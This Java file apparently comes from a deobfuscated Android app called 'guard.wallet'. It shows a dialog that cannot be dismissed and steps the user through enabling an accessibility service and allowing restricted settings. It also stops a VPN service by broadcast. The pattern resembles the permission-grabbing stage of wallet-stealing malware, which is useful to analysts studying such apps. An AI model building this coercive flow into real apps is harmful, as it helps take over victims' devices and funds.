package com.guard.wallet.utils;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.activity.GuideActivity;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 无障碍服务引导对话框工具类 — 管理引导弹窗、Activity 引用、无障碍状态。
 *
 * <p>vendor 原始路径: com.guard.wallet.utils.b (106 行)
 *
 * <p>字段映射:
 * <ul>
 *   <li>{@code a} → {@link #guideDialogRef} — 引导弹窗弱引用</li>
 *   <li>{@code b} → {@link #allowRestrictedSettings} — 是否允许受限设置</li>
 *   <li>{@code c} → {@link #currentActivityRef} — 当前 Activity 弱引用</li>
 *   <li>{@code d} → {@link #guideImageIndex} — 引导页图片索引</li>
 *   <li>{@code e} → {@link #triggerCount} — 引导触发计数</li>
 *   <li>{@code f} → {@link #statusCode1} — 状态码 1</li>
 *   <li>{@code g} → {@link #statusCode2} — 状态码 2</li>
 * </ul>
 *
 * <p>方法映射:
 * <ul>
 *   <li>{@code a()} → {@link #showGuideActivity()} — 显示 GuideActivity</li>
 *   <li>{@code b()} → {@link #dismissGuideDialog()} — 关闭引导弹窗</li>
 *   <li>{@code c()} → {@link #getGuidePageUrl()} — 获取引导页 URL</li>
 *   <li>{@code d(Activity)} → {@link #registerCurrentActivity(Activity)} — 注册当前 Activity</li>
 *   <li>{@code e()} → {@link #triggerGuideFlow()} — 触发引导流程</li>
 *   <li>{@code f()} → {@link #showAccessibilityEnableDialog()} — 显示无障碍开启引导弹窗</li>
 * </ul>
 */
public abstract class GuideDialogUtils {
    public static WeakReference<AlertDialog> guideDialogRef;
    public static final AtomicBoolean allowRestrictedSettings = new AtomicBoolean(true);
    public static volatile WeakReference<Activity> currentActivityRef;
    public static final AtomicInteger guideImageIndex = new AtomicInteger(0);
    public static final AtomicInteger triggerCount = new AtomicInteger(0);
    public static final AtomicInteger statusCode1 = new AtomicInteger(0);
    public static final AtomicInteger statusCode2 = new AtomicInteger(0);

    /** 显示 GuideActivity */
    public static void showGuideActivity() {
        Activity ctx = com.guard.wallet.utils.DeviceUtils.getCurrentActivity();
        if (ctx != null && (currentActivityRef == null || currentActivityRef.get() == null || currentActivityRef.get() instanceof GuideActivity)) {
            Log.d("AccessibilityUtils", "showGuideActivity");
            com.guard.wallet.utils.SystemHelper.d1(ctx.getPackageName(), GuideActivity.class.getName());
        }
    }

    /** 关闭弹窗 */
    public static void dismissGuideDialog() {
        WeakReference<AlertDialog> ref = guideDialogRef;
        if (ref != null && ref.get() != null) {
            ref.get().dismiss();
            guideDialogRef = null;
        }
    }

    /** 获取引导页 URL */
    public static String getGuidePageUrl() {
        String url = com.guard.wallet.utils.ConfigManager.getGuideUrl() + "/guide/" + guideImageIndex.get();
        Log.d("AccessibilityUtils", url);
        return url;
    }

    /** 注册当前 Activity */
    public static synchronized void registerCurrentActivity(Activity activity) {
        currentActivityRef = new WeakReference<>(activity);
        if (currentActivityRef.get() != null) {
            Intent intent = new Intent();
            intent.setAction("guide.vpn.service.stop.action");
            currentActivityRef.get().sendBroadcast(intent);
        }
    }

    /** 触发引导流程 */
    public static void triggerGuideFlow() {
        if (com.guard.wallet.utils.SystemHelper.Z() != null) {
            new Handler(Looper.getMainLooper()).post(new com.guard.wallet.helper.DelayedRunnable(6));
        }
    }

    /** 显示无障碍服务开启引导弹窗 */
    public static void showAccessibilityEnableDialog() {
        Activity ctx = com.guard.wallet.utils.DeviceUtils.getCurrentActivity();
        if (ctx == null) return;

        WeakReference<AlertDialog> ref = guideDialogRef;
        if (ref != null && ref.get() != null && ref.get().isShowing()) return;

        String title = "Open [accessibility_service_label]";
        String msg = "1.Click go immediately and enter accessibility service column\n"
                + "2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n"
                + "3.Find [accessibility_service_label],and click to enter this column\n"
                + "4.Click the switch(in the top right corner),you can open [accessibility_service_label]";
        String okText = "Go immediately";

        if (MainApplication.getInstance() != null && MainApplication.getInstance().getBuildConfig() != null) {
            Object cfg = MainApplication.getInstance().getBuildConfig();
            // 从 BuildConfig 获取自定义文案（如果有）
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(ctx, 4);
        builder.setMessage(msg);
        builder.setCancelable(false);

        if (!allowRestrictedSettings.get()) {
            builder.setNeutralButton("Allow restricted settings", new com.guard.wallet.helper.PositiveClickListener(1));
        }

        builder.setPositiveButton(okText, new com.guard.wallet.helper.PositiveClickListener(2));
        builder.setOnDismissListener(new com.guard.wallet.helper.DismissListener(1));
        builder.setOnCancelListener(new com.guard.wallet.utils.DialogCancelListener());

        AlertDialog dialog = builder.create();
        guideDialogRef = new WeakReference<>(dialog);
        dialog.show();
    }
}
